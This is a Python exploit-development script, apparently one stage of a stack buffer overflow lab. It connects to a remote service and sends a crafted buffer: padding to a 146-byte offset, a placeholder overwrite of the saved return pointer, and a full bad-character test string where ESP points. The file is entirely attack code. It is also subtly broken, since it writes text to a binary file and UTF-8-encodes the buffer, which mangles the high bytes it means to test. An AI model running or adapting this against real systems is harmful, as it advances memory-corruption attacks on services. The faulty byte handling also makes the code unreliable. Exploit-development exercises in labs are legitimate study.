#!/usr/bin/env python3
# stage 5 - testing for bad characters 
# replacing esp with badchars_test
import socket,sys

RHOST = sys.argv[1]
RPORT = int(sys.argv[2])

# handle connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# setup payload 
offset = 146
total_buff_size = 650

# setup bad characters payload
badchars_test = ""
badchars = [0x00, 0x0A]                                   # common bad characters

# generate bad characters
for c in range(0x00, 0xFF+1):
    if c not in badchars:                                 # skip bad characters
        badchars_test += chr(c)                           # addig non-bad characters

# create a file to write(w) the string as binary data(b).
with open("badchars_test.bin", "wb") as f:
    f.write(badchars_test)


buff = ""
payload = "\x41" * (offset - len(buff))                   # lead padding
eip = "\x42" * 4                                          # saved return pointer overwrite 
esp = badchars_test                                          # where esp should be pointing
postfix = "\n"              
trail_padding = "\x44" * (total_buff_size - len(buff) - len(payload) - len(eip) - len(esp) - len(postfix))

# verify if its the correct length. should be 650 total
# print(len(buff), len(payload), len(eip), len(esp), len(trail_padding), len(postfix))

# final payload
buff += payload + eip + esp + trail_padding + postfix 

# payload status
print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff)))
s.sendall(buff.encode('utf-8'))
s.close()
